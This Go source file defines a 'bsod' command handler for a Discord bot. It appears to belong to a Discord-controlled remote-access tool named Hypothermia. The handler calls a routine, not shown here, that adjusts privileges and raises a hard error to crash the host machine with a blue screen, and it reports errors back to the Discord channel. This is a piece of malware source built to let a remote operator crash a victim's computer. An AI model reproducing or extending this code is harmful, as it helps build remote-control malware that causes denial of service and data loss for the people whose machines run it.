package commands

import (
	"fmt"

	"Hypothermia/src/funcs"
	"Hypothermia/src/misc"

	"github.com/bwmarrin/discordgo"
)

const bsodRaiseError string = "🟥 Failed to raise hard error: %s"

func (*BSODCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	code, err := funcs.BlueScreen()
	switch code {
	case -1:
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.ERROR_F_ADJUST_PRIVILEGE, err), m.Reference())
		return

	case -2:
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(bsodRaiseError, err), m.Reference())
		return
	}

	// success
}

func (*BSODCommand) Name() string {
	return "bsod"
}

func (*BSODCommand) Info() string {
	return "triggers the blue screen of death"
}

type BSODCommand struct{}
